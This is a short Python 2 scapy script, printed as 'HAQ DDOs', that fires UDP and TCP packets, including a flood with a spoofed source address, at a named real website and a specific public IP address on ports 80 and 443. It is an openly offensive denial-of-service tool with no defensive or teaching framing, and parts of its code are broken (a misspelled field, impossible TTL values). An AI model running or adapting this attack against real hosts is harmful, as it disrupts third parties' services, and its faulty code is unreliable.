#-*- coding:'utf-8' -*-
import  time
import  struct
from threading import *
import socket
from scapy.all  import  *
start=time.time()
screenlock=Semaphore(value=1000)
print '[^]HAQ DDOs start!'
def DDos():
  try:
    print '[*]Second layers of DDos'
    s=srp(IP(dst="www.dgjy.net",ttl=480)/UDP())
    print s[0].show()
  except Exception,e:
      print '[-]The cause of the mistake {}'.format(e)
  try:
    print '[*]Third layer DDos'
    p = srloop(IP(dst="www.dgjy.net", ttl=160) / UDP())
    print p[0].show()
  except Exception,s:
      print '[-]The cause of the mistake{}'.format(s)
  try:
    print '[*]Repeated attacks'
    see=srp(IP(dst="113.108.127.169")/TCP(dport=[80,443]))
    print see[0].show()
  except Exception,f:
      print '[-]The cause of the mistake{}'.format(f)
  try:
    data = struct. pack ('=BHI',0x96,20,1000)
    pkt = IP(src='192.168.225.141',dst='113.108.127.169')/UDP(sport= 12345,dport=[80,443])/data
    print '[*]DDoS attacks are being carried out!'
    screenlock.acquire()
    send (pkt,inter= 1 ,count= 160)
  except Exception,g:
      print "[-]The cause of the mistake{}".format(g)
  try:
      print '[*]DDos'
      gp=sr1(IP(dst="www.dgjy.net",tll=(1,160))/UDP())
  except Exception,i:
      print '[-]cause of the mistake{}'.format(i)
t = Thread(target=DDos, args=())
t.start()
end=time.time()
print '[!]Time consuming of this program,The first time is the initialization time:',end-start